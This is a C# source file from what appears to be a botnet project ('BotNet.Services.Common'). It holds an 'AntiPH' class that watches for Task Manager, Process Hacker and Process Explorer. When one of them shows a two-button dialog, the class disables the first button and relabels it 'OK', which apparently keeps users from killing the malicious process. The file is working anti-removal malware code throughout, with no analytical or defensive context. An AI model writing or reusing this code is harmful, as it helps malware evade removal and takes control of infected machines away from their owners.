
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace BotNet.Services.Common
{
    class AntiPH
    {
        private readonly List<IntPtr> CLD = new List<IntPtr>();

        [DllImport("user32.dll")]
        private static extern bool EnableWindow(IntPtr hWnd, bool bEnable);

        private bool EnumChild(int hWnd, int lParam)
        {
            CLD.Add((IntPtr)hWnd);
            return true;
        }

        [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int EnumChildWindows(IntPtr hWnd, EnumWindProc lpEnumFunc, ref IntPtr lParam);

        private IntPtr[] GetChild(IntPtr hwd)
        {
            var manager = this;
            lock (manager)
            {
                CLD.Clear();
                var zero = IntPtr.Zero;
                EnumChildWindows(hwd, EnumChild, ref zero);
                return CLD.ToArray();
            }
        }

        [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true,
            ExactSpelling = true)]
        private static extern int GetClassName(int hwnd,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowTextLength(int hwnd);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

        public void protect()
        {
            while (true)
            {
                Thread.Sleep(200);
                var foregroundWindow = GetForegroundWindow();
                if (foregroundWindow.ToInt32() != 0)
                {
                    var lpdwProcessID = 0;
                    GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
                    if (lpdwProcessID > 0)
                    {
                        var str = "";
                        var windowTextLength = GetWindowTextLength((int)foregroundWindow);
                        if (windowTextLength == 0)
                        {
                            str = "";
                        }
                        else
                        {
                            var lpString = new StringBuilder(windowTextLength + 1);
                            if (GetWindowText((int)foregroundWindow, lpString, lpString.Capacity) == 0)
                            {
                                str = "";
                            }
                            else
                            {
                                str = lpString.ToString();
                            }
                        }
                        var processById = Process.GetProcessById(lpdwProcessID);
                        if ((processById.ProcessName.ToLower() == "taskmgr") |
                            (processById.ProcessName.ToLower() == "processhacker") |
                            (str.ToLower() == "process explorer"))
                        {
                            var list = new List<IntPtr>();
                            var num4 = 0;
                            foreach (var ptr2 in GetChild(foregroundWindow))
                            {
                                var lpClassName = new string(' ', 200);
                                var startIndex = GetClassName((int)ptr2, ref lpClassName, 200);
                                lpClassName = lpClassName.Remove(startIndex, 200 - startIndex);
                                if (lpClassName.ToLower() == "button")
                                {
                                    list.Add(ptr2);
                                }
                                if ((lpClassName.ToLower() == "static") | (lpClassName.ToLower() == "directuihwnd"))
                                {
                                    num4++;
                                }
                            }
                            if ((list.Count == 2) & ((num4 == 2) | (num4 == 1)))
                            {
                                EnableWindow(list[0], false);
                                var lParam = "OK";
                                SendMessage((int)list[0], 12, 0, ref lParam);
                            }
                        }
                    }
                }
            }
        }

        [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true,
            ExactSpelling = true)]
        private static extern int SendMessage(int hwnd, int wMsg, int wParam,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

        private delegate bool EnumChildWindProc(int hWnd, int lParam);

        private delegate bool EnumWindProc(int hWnd, int lParam);
    }
}
